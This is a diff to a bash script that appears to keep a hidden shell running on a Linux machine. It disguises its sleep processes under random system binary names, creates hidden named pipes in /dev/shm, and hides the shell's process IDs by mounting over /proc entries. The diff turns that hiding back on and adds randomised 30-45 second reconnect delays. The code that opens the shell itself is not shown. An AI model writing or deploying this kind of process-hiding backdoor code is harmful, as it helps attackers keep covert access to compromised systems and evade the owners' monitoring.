@@ -43,7 +43,8 @@ cleanup() {
 }
 ssleep() { 
     local fake_name="/bin/$(ls /sbin | shuf -n 1)" 
-    local duration=$(shuf -i 30-45 -n 1) # wait between 30 and 45 seconds 
+    #local duration=$(shuf -i 30-45 -n 1) # wait between 30 and 45 seconds 
+    local duration=$1 # wait between 30 and 45 seconds 
     (exec -a "$fake_name" sleep "$duration") & 
     local sleep_pid=$! 
     
@@ -68,7 +69,7 @@ mtab     # hide current script pid
 
 # MAIN 
 while true; do
-        #mtab
+        mtab
         PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
         mkfifo "$PIPE"
 
@@ -87,6 +88,7 @@ while true; do
         fi
         # HIde the created shell
         pid=$!
+	ssleep 1
         pids="$pid $(pgrep -P $pid)"
         for i in $pids;do mtab $i;done
         wait "$pid"
@@ -95,5 +97,5 @@ while true; do
         umount -l /proc/$$ 2>/dev/null
 
         # This function handles its own mounting and unmounting
-        ssleep
+        ssleep $(shuf -i 30-45 -n 1) # wait between 30 and 45 seconds 
 done &>/dev/null
